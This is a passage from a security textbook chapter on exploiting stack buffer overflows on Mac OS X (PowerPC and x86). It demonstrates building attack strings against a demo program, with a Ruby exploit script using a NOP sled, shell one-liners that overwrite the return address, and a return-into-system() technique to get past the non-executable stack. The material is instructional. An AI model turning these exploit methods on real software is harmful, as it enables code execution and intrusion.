used here is better for determining proper alignment and is somewhat easier
to spot in register-value dumps, at the expense of some fl exibility.
Now we will demonstrate how you can use the pattern string to identify the
offsets into your attack string where the controlled registers get their values.
You know that the stack buffer is 1,024 bytes long, so now you should run
smashmystack.ppc with an argument generated by
arg0 = “Z” * 1024 + pattern
This will result in the following crash dump to appear in the ReportCrash
log:
Exception Type: EXC_BAD_ACCESS (SIGSEGV)
Exception Codes: KERN_INVALID_ADDRESS at 0x0000000049494948
Crashed Thread: 0
Thread 0 Crashed:
0 ??? 0x49494948 0 + 1229539656
Thread 0 crashed with PPC Thread State 32:
srr0: 0x49494948 srr1: 0x4000f030 dar: 0x00003138 dsisr: 0x40000000
r0: 0x49494949 r1: 0xbfffef50 r2: 0x00000001 r3: 0xbfffeb38
r4: 0xbffff584 r5: 0xbffff00c r6: 0xfefefeff r7: 0x80808080
r8: 0x00000000 r9: 0xbffff021 r10: 0x797978ff r11: 0x8fe33c48
r12: 0x80808080 r13: 0x00000000 r14: 0x00000000 r15: 0x00000000
r16: 0x00000000 r17: 0x00000000 r18: 0x00000000 r19: 0x00000000
r20: 0x00000000 r21: 0x00000000 r22: 0x00000000 r23: 0x00000000
r24: 0x00000000 r25: 0x00000000 r26: 0xbfffeffc r27: 0x0000000c
r28: 0x00000000 r29: 0x00000000 r30: 0x45454545 r31: 0x46464646
cr: 0x22000022 xer: 0x20000000 lr: 0x49494949 ctr: 0x00000000
vrsave: 0x00000000
The offsets in the pattern string for the controlled registers are as follows:
■ r30 = 16 bytes
■ r31 = 20 bytes
■ r0, lr = 32 bytes
9955336633cc0077..iinndddd 116688 11//2255//0099 44::4411::4466 PPMM
Chapter 7 ■ Exploiting Stack Overflows 169
This means our attack string will have the following format:
[ 1040 bytes space ] [ r30 ] [ r31 ] [ 8 bytes space ] [ lr ]
Recall from the PowerPC subroutine epilog earlier in this chapter that the
value for the link register is loaded from 8 bytes past the stack pointer. In this
example, we will hard-code the stack memory address of our payload in our
attack string at the offset for the overwritten link register (lr). The chosen value
for the link register must be 12 bytes greater than the value of the stack pointer,
so that the target program will return to and execute the bytes from the attack
string immediately following the value for lr. This is the location in the attack
string where you should place your shellcode or other payload.
For an initial payload, you can simply use a single breakpoint trap instruc-
tion. This will allow you to verify that you are executing your exploit payload
without having to worry about the payload failing for any other reason. You can
also use a variation of this to fi gure out how much space you have available for
your payload in the attack string. If you test the exploit with a payload of many
no-operation (or NOP) instructions with a single breakpoint trap instruction at
the end and the exploit causes the program to crash with a breakpoint excep-
tion, you know the entire payload was executed. A sequence of repeated NOP
instructions is usually referred to as a NOP slide or NOP sled.
At this point, the attack string is complex enough that it makes sense to put
it together in a complete script rather then regenerating it on the command-line
each time. The following Ruby script shows how to programmatically generate
the attack string for this simple exploit.
#!/usr/bin/env ruby
NOP = [0x30800114].pack(‘N’)
TRAP = [0x7c852808].pack(‘N’)
r30 = “AAAA”
r31 = “BBBB”
lr = [0xdeadbeef].pack(‘N’)
payload = NOP * 256 + TRAP
puts “Z” * 1040 + r30 + r31 + “Z” * 8 + lr + payload
The fi rst time that you run this exploit, you should use a special invalid value
for the link register (the script above uses 0xdeadbeef). This will allow you to
run the exploit once, record the value of the stack pointer from the ReportCrash
thread state listing, and use that to calculate the correct value for the link regis-
ter. Recall that the payload in your attack string will start 12 bytes after the value
of the stack pointer when the target program branches to the link register.
% ./smashmystack.ppc `./exp.rb`
Segmentation fault
9955336633cc0077..iinndddd 116699 11//2255//0099 44::4411::4466 PPMM
170 Part III ■ Exploitation
The ReportCrash log looks like the following:
Exception Type: EXC_BAD_ACCESS (SIGSEGV)
Exception Codes: KERN_INVALID_ADDRESS at 0x00000000deadbeec
Crashed Thread: 0
Thread 0 Crashed:
0 ??? 0xdeadbeec 0 + 3735928556
Thread 0 crashed with PPC Thread State 32:
srr0: 0xdeadbeec srr1: 0x4000f030 dar: 0x00003138 dsisr: 0x40000000
r0: 0xdeadbeef r1: 0xbfffe8d0 r2: 0x00000001 r3: 0xbfffe4b8
r4: 0xbffff238 r5: 0xbfffe978 r6: 0xfefefeff r7: 0x80808080
r8: 0x00000000 r9: 0xbfffece1 r10: 0x842706ff r11: 0x8fe33c48
r12: 0x00808080 r13: 0x00000000 r14: 0x00000000 r15: 0x00000000
r16: 0x00000000 r17: 0x00000000 r18: 0x00000000 r19: 0x00000000
r20: 0x00000000 r21: 0x00000000 r22: 0x00000000 r23: 0x00000000
r24: 0x00000000 r25: 0x00000000 r26: 0xbfffe968 r27: 0x0000000c
r28: 0x00000000 r29: 0x00000000 r30: 0x41414141 r31: 0x42424242
cr: 0x22000022 xer: 0x20000000 lr: 0xdeadbeef ctr: 0x00000000
vrsave: 0x00000000
Now, rerun the exploit with the link register value set to sp + 12
(0xbfffe8dc):
% ./smashmystack.ppc `./exp.rb`
Trace/BPT trap
%
Success! You have executed the entire payload. This method of calculating
the exact return address works well for local exploits, but is not automated
and is obviously infeasible for remote exploits since we have to find and
hard-code memory addresses. Later in this chapter, in the section “Finding
Useful Instruction Sequences,” we will describe how to fi nd useful instruction
sequences to return to in order to transfer control indirectly to your payload in
the stack without having to hard-code or guess memory addresses.
Smashing the Stack on x86
In the previous section we demonstrated how to exploit stack buffer overfl ows
on the PowerPC. We will now describe the more common architecture, Intel
x86. We will show you how to build your exploits in the same manner as in
the previous section by ignoring Library Randomization for now. In the next
few sections, we will describe techniques to overcome Library Randomization
reliably, as well work around the non-executable stack segment.
9955336633cc0077..iinndddd 117700 11//2255//0099 44::4411::4466 PPMM
Chapter 7 ■ Exploiting Stack Overflows 171
The fi rst example will exploit the same simple program with a trivial stack
buffer overfl ow vulnerability, as in the previous section on PowerPC stack over-
fl ows. If you run this program with an overly long fi rst argument consisting
of all ASCII ‘A’ characters, it will crash after it tries to return from the smash-
mystack() function.
% ./smashmystack `ruby -e ‘puts “A” * 2000’`
Segmentation fault
The ReportCrash log should resemble the following:
Exception Type: EXC_BAD_ACCESS (SIGSEGV)
Exception Codes: KERN_INVALID_ADDRESS at 0x0000000041414141
…
Unknown thread crashed with X86 Thread State (32-bit):
eax: 0xbfffe4d0 ebx: 0xbfffe994 ecx: 0xbffff19b edx: 0x00000000
edi: 0x00000000 esi: 0x00000000 ebp: 0x41414141 esp: 0xbfffe8e0
ss: 0x0000001f efl: 0x00010246 eip: 0x41414141 cs: 0x00000017
ds: 0x0000001f es: 0x0000001f fs: 0x00000000 gs: 0x00000037
cr2: 0x41414141
One of the benefi ts of using the ASCII ‘A’ string is that it makes it easy to see
which registers are overwritten and controllable through a memory-corruption
vulnerability. In the above register dump, you can see that you can control the
values of the EIP and EBP registers. The most important register to control is
EIP, since it contains the address of the CPU instruction to execute next. As
mentioned before, the values of several general-purpose registers (EBX, EBP,
ESI, EDI) are also commonly saved to the stack. It is common to see the values
of these registers also overwritten after a stack buffer overfl ow.
As in the PowerPC example, the next step is to fi nd the offsets within the
attack string that correspond to the values restored into specifi c registers in
the vulnerable program. There are several approaches to this: calculating exact
offsets based on examining the vulnerable code, using a specially crafted string
to help us identify the offset based on the value restored into the register as was
done in the PowerPC exploit example, or using a simple binary search.
1fc6: push ebp
1fc7: mov ebp,esp
1fc9: sub esp,0x418 ; Reserve 1024 + 16 + 8 bytes
1fcf: mov eax,DWORD PTR [ebp+8]
1fd2: mov DWORD PTR [esp+4],eax
1fd6: lea eax,[ebp-0x408]
1fdc: mov DWORD PTR [esp],eax
1fdf: call 3005 
1fe4: leave
1fe5: ret
9955336633cc0077..iinndddd 117711 11//2255//0099 44::4411::4466 PPMM
172 Part III ■ Exploitation
As you can see in the disassembly, the smashmystack() function reserves 1028
bytes on the stack: 1024 for the stack buffer buf, 16 bytes reserved for saving
registers if needed, and 8 bytes for the two arguments to the call to the strcpy()
function. You can see that the stack buffer begins at 1032 bytes before EBP.
Immediately above the frame pointer is the saved frame pointer and return
address, in that order. If you supply an input string of 1040 bytes long, the 32-bit
values beginning at byte offsets 1032 and 1036 will overwrite the saved frame
pointer and saved return address, respectively.
We will now proceed to show how you can build the attack string by hand
on the command line using Ruby one-line scripts and Leopard’s ReportCrash
output logs. First, verify that you can control EIP by overwriting the return
address on the stack with a chosen value of “BBBB” (0x42424242):
% ./smashmystack `ruby -e ‘puts “A” * 1036 + “BBBB”’`
In the ReportCrash log, you will see that you caused an EXC_BAD_ACCESS
exception due to a KERN_INVALID_ADDRESS at 0x42424242:
Exception Type: EXC_BAD_ACCESS (SIGSEGV)
Exception Codes: KERN_INVALID_ADDRESS at 0x0000000042424242
…
Unknown thread crashed with X86 Thread State (32-bit):
eax: 0xbfffec50 ebx: 0xbffff114 ecx: 0xbffff55b edx: 0x00000000
edi: 0x00000000 esi: 0x00000000 ebp: 0x41414141 esp: 0xbffff060
ss: 0x0000001f efl: 0x00010246 eip: 0x42424242 cs: 0x00000017
ds: 0x0000001f es: 0x0000001f fs: 0x00000000 gs: 0x00000037
cr2: 0x42424242
You can now easily replace “BBBB” with any memory address that you
choose and the vulnerable program will attempt to execute instructions from
that address. Also be aware that since the x86 ret instruction pops the return
address from the stack, the stack pointer (ESP) will point to the portion of the
attack string that immediately follows the return address. The address for this
location in memory is listed as the value of ESP in the ReportCrash register
dump above. You can use this information along with the values of the other
registers in the thread state dump to fi gure out where these registers point
relative to your attack string in memory. This comes in handy for a variety of
exploitation techniques.
Now, check what happens when you put some simple executable code at the
end of your attack string and use its address on the stack for the return address.
In the attack string below, you should use the value of ESP from the ReportCrash
dump (0xbffff060 in this case) for the return address. For an executable code
payload, you can use a sequence of 0xCC bytes, which is the encoding of the
x86 breakpoint instruction.
% ./smashmystack `ruby -e ‘puts “A” * 1036 + \
[0xbffff060].pack(“V”) + “\xCC\xCC\xCC\xCC”’`
9955336633cc0077..iinndddd 117722 11//2255//0099 44::4411::4466 PPMM
Chapter 7 ■ Exploiting Stack Overflows 173
The ReportCrash log shows something different this time as opposed to the
previous PowerPC example that executed the breakpoint instruction.
Exception Type: EXC_BAD_ACCESS (SIGSEGV)
Exception Codes: KERN_PROTECTION_FAILURE at 0x00000000bffff050
…
Unknown thread crashed with X86 Thread State (32-bit):
eax: 0xbfffec40 ebx: 0xbffff10c ecx: 0xbffff553 edx: 0x00000000
edi: 0x00000000 esi: 0x00000000 ebp: 0x41414141 esp: 0xbffff050
ss: 0x0000001f efl: 0x00010246 eip: 0xbffff050 cs: 0x00000017
ds: 0x0000001f es: 0x0000001f fs: 0x00000000 gs: 0x00000037
cr2: 0xbffff050
Notice that ReportCrash reported a different exception code this time, KERN_
PROTECTION_FAILURE. This is because under x86 versions of Mac OS X, the
stack memory is marked non-executable using the NX memory hardware pro-
tections of the Intel Core processors. Luckily that won’t prove to be too much
trouble as you will see below.
Exploiting the x86 Non-executable Stack
Exploits against other operating systems with non-executable stacks have tra-
ditionally used a technique called return-to-libc, originally attributed to Solar
Designer. return-to-libc exploits overwrite the return address with the address
of a subroutine in an already loaded library, effectively calling the subroutine
with parameters taken from the attack string. This technique works on most
architectures where the stack grows downward, and especially well on architec-
tures like x86 where subroutine parameters are also passed on the stack. Using
this technique allows the attacker, with some limitations, to call a sequence
of chosen subroutines with chosen parameters. Most return-into-libc exploits
typically mark the memory containing the exploit payload executable or copy
the payload into executable memory.
We will demonstrate several variants of the return-into-libc technique, begin-
ning with a simple variant where the exploit returns into the system() function
to execute an arbitrary command and ending with a way to execute arbitrary
payloads on a non-executable stack without having to know the payload’s
address in memory.
Return into system()
As described earlier, return-to-libc exploits can use the overwritten return
address and stack to call library functions with arguments chosen by the
attacker. One of the easiest ways to take advantage of this is to call the system()
function to execute a chosen shell command.
9955336633cc0077..iinndddd 117733 11//2255//0099 44::4411::4477 PPMM
174 Part III ■ Exploitation
Leopard’s Library Randomization is performed only periodically; the address
to which a library is loaded in one process will typically be the same address
to which it is loaded in subsequent processes, even after a reboot. This allows
you to identify the address of useful functions and instruction sequences in
loaded libraries in one process and safely use those in another process, such
as one where you are exploiting a buffer overfl ow. It should be noted, however,
that this works only for local exploits as the randomized addresses will almost
certainly be different across systems.
As described in Chapter 1, “Mac OS X Architecture,” the random base address
of each library stored in the shared cache map is /var/db/dyld. You can also
use nm command to dump the symbol table in the library and fi nd the offset
from that base address where a given function will be found. For example,
you will fi nd the address of the system() function in libSystem. First check the
base address of libSystem in /var/db/dyld/dyld_shared_cache_i386.map. This
fi le is a simple ASCII text fi le that lists the library name and base addresses
where segments within that library are loaded. Here is the relevant section for
libSystem.
/usr/lib/libSystem.B.dylib
__TEXT 0x92689000 -> 0x927E9000
__DATA 0xA0417000 -> 0xA0456000
__IMPORT 0xA0A38000 -> 0xA0A3A000
__LINKEDIT 0x9735F000 -> 0x9773D000
Look up the address of the system() function in libSystem’s symbol table with
the nm utility that is installed with Xcode.
% nm /usr/lib/libSystem.B.dylib | grep “T _system”
0008e014 T _system
0009afe1 T _system$NOCANCEL$UNIX2003
0006be57 T _system$UNIX2003
If you add the offset from the system table to the TEXT segment base address,
you will fi nd that system() is at 0x92717014. You can easily verify this with GDB
by debugging a live process and printing the address of the system function.
Breakpoint 1, 0x00001fec in main ()
(gdb) p system
$1 = {} 0x92717014 
You can now use this address to begin to construct your attack string. As
mentioned earlier, you also encode the arguments to the function that you
return to in your attack string. The system() function takes a single string argu-
ment that is the shell command to execute. For that you need to fi nd out exactly
9955336633cc0077..iinndddd 117744 11//2255//0099 44::4411::4477 PPMM
Chapter 7 ■ Exploiting Stack Overflows 175
where your attack string is in memory. You can use the debugger to calculate
that address by examining the stack just as you take control.
(gdb) run `ruby -e ‘puts “A” * 1036 + [0xcafebabe,0xfeedface,0xdeadbeef]
.pack(“VVV”) + “id”’`
Starting program:
/Volumes/Data/Users/ddz/Projects/MacHackers/Chapters/07 Exploiting Stack
Overflows/Research/smashmystack.x86 `ruby -e ‘puts “A” * 1036 +
[0xcafebabe,0xfeedface,0xdeadbeef].pack(“VVV”) + “id”’`
Reading symbols for shared libraries ++. done
Program received signal EXC_BAD_ACCESS, Could not access memory.
Reason: KERN_INVALID_ADDRESS at address: 0xcafebabe
0xcafebabe in ?? ()
At this point, the overwritten return address has been popped off of the stack
and the program has stopped with an exception trying to execute instructions
at address 0xcafebabe, which does not exist. If you replace this address with
the address of system() and execute it instead, it will look for its fi rst argument
at ESP+8, which points to the position in the attack string of the command to
be executed (“id”).
(gdb) x/s $esp+8
0xbfffedf8: “id”
Now you can place the address of system() replacing 0xcafebabe and the
address of the command string in the attack string replacing 0xdeadbeef to
execute system(“id”).
(gdb) run `ruby -e ‘puts “A” * 1036 +
[0x92717014,0xfeedface,0xbfffedf8].pack(“VVV”) + “id”’`
Starting program:
/Volumes/Data/Users/ddz/Projects/MacHackers/Chapters/07 Exploiting Stack
Overflows/Research/smashmystack.x86 `ruby -e ‘puts “A” * 1036 +
[0x92717014,0xfeedface,0xbfffedf8].pack(“VVV”) + “id”’`